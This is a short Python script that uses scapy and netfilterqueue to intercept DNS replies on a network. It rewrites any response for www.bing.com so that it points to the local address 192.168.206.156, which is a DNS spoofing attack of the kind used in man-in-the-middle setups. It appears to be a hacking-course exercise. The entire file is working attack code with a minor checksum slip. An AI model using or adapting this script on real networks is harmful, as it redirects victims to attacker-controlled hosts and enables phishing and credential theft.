#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
# import NFQP3

'''
apt-get install libnetfilter-queue-dev

pip3 install NFQP3

'''

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = str(scapy_packet[scapy.DNSQR].qname)
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname="www.bing.com",rdata="192.168.206.156")
            print(scapy_packet.show())
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.UDP].len 
            del scapy_packet[scapy.UDP].chksum 
            del scapy_packet[scapy.IP].len 
            del scapy_packet[scapy.UDP].chksum 

            packet.set_payload(bytes(scapy_packet))
            # packet.payload = scapy.Raw(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
